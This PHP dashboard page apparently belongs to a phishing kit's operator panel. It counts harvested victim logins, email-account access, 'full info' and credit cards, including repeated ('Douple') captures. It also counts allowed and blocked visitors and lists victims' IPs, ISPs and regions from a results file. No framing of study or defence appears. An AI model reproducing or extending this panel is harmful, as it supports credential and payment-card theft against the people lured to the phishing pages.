<?php 
require("requires/headers.php");
?>
      
        <div class="page-header">
          <div class="container-fluid">
            <h2 class="h5 no-margin-bottom">Dashboard</h2>
          </div>
        </div>
        <section class="no-padding-top no-padding-bottom">
          <div class="container-fluid">
            <div class="row">
              <div class="col-md-4 col-sm-4">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"><i class="icon-user-1"></i></div><strong>All Visitors</strong>
                    </div>
                    <div class="number dashtext-1"><?php echo $countAll; ?></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 100%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-1"></div>
                  </div>
                </div>
              </div>
              <div class="col-md-4 col-sm-4">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"><i class="icon-contract"></i></div><strong>Allowed Visitors</strong>
                    </div>
                    <div class="number dashtext-2"><?php echo  $countallowed; ?></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 100%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-2"></div>
                  </div>
                </div>
              </div>
              <div class="col-md-4 col-sm-4">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"><i class="icon-paper-and-pencil"></i></div><strong>Blocked Visitors</strong>
                    </div>
                    <div class="number dashtext-3"><?php echo $blocked; ?></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 105%" aria-valuenow="55" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-3"></div>
                  </div>
                </div>
              </div>

              <!-- Result Info -->
              <div class="col-md-3 col-sm-3">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"></div><strong>Logins</strong>
                    </div>
                    <div class="number dashtext-4"><?php echo $countLogins; ?></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-4"></div>
                  </div>
                </div>
              </div>
              <div class="col-md-3 col-sm-3">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"></div><strong>Email Access</strong>
                    </div>
                    <div class="number dashtext-4"><?php echo $countEmail; ?></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-4"></div>
                  </div>
                </div>
              </div>
              
              <div class="col-md-3 col-sm-3">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"></div><strong>Full Info</strong>
                    </div>
                    <div class="number dashtext-4"><?php echo $countInfo; ?></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-4"></div>
                  </div>
                </div>
              </div>
              <div class="col-md-3 col-sm-3">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"></div><strong>Credit Card</strong>
                    </div>
                    <div class="number dashtext-4"><?php echo $countcredit; ?></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-4"></div>
                  </div>
                </div>
              </div>
              <div class="col-md-4 col-sm-4">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"></div><strong>Douple Logins</strong>
                    </div>
                    <div class="number dashtext-4"><?php echo $countLogins2;  ?></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-4"></div>
                  </div>
                </div>
              </div>
              <div class="col-md-4 col-sm-4">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"></div><strong>Douple Email Access</strong>
                    </div>
                    <div class="number dashtext-4"><?php echo $countEmail2;  ?></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-4"></div>
                  </div>
                </div>
              </div>
              <div class="col-md-4 col-sm-4">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"></div><strong> Douple Credit Card</strong>
                    </div>
                    <div class="number dashtext-4"><?php echo $countcredit2; ?></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-4"></div>
                  </div>
                </div>
              </div>



            </div>
          </div>
        </section>
        
        <section class="no-padding-top">
          <div class="container-fluid">
            <div class="row">
              
              <div class="col-sm-12">
                <div class="block margin-bottom-sm">
                  <div class="title"><strong>Allowed Visitors</strong></div>
                  <div class="table-responsive"> 
                    <table class="table table-striped">
                      <thead>
                        <tr>
                          <th>IP</th>
                          <th>Country</th>
                          <th>ISP</th>
                          <th>Region Name</th>
                          <th>Date</th>
                        </tr>
                      </thead>
                      <tbody>
                        <?php

                        $fileAllowedIP =  file_get_contents('result/allowed.txt');
                        if ($fileAllowedIP) {
                          $fileAllowedIP = preg_split('/\n|\r\n?/', $fileAllowedIP);
                           // echo($fileAllowedIP);
                          foreach ($fileAllowedIP as $line ) {
                            if ($line != "") {
                              $splitor = explode("|", $line);
                              $ipSplit = $splitor[0];
                              $countrySplit = $splitor[1];
                              $ispSplit = $splitor[2];
                              $regionSplit = $splitor[3];
                              $dateSplit = $splitor[4];
                            ?>
                          <tr style="color:white !important">
                          
                            <td><?php echo $ipSplit; ?> </td>
                            <td><img src="https://www.countryflags.io/<?php echo $countrySplit; ?>/shiny/64.png" width="25"> <?php echo $countrySplit; ?> </td>
                            <td><?php echo $ispSplit; ?></td>
                            <td><?php echo $regionSplit; ?></td>
                            <td><?php echo $dateSplit; ?></td>
                          </tr>
                    <?php
                          }}
                        }else{?>

                          <tr style="color:white !important">
                          
                            <td> Null </td>
                            <td> Null </td>
                            <td> Null </td>
                            <td> Null </td>
                            <td> Null </td>
                          </tr>

                        <?php }?> 
                        
                        
                        
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
              
            </div>
          </div>  
        </section>
<?php
require("requires/footer.php");
 ?>